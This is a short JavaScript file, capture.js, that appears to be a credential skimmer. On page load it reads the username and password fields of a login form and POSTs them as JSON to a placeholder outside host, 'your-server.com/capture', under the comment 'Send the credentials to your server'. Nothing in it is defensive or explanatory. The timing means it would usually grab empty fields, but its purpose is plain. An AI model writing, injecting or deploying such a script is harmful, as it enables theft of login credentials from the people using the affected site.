// capture.js
document.addEventListener('DOMContentLoaded', (event) => {
    const usernameInput = document.querySelector('input[name="username"]');
    const passwordInput = document.querySelector('input[name="password"]');

    if (usernameInput && passwordInput) {
        const username = usernameInput.value;
        const password = passwordInput.value;

        // Send the credentials to your server
        fetch('https://your-server.com/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ username, password }),
        });
    }
});
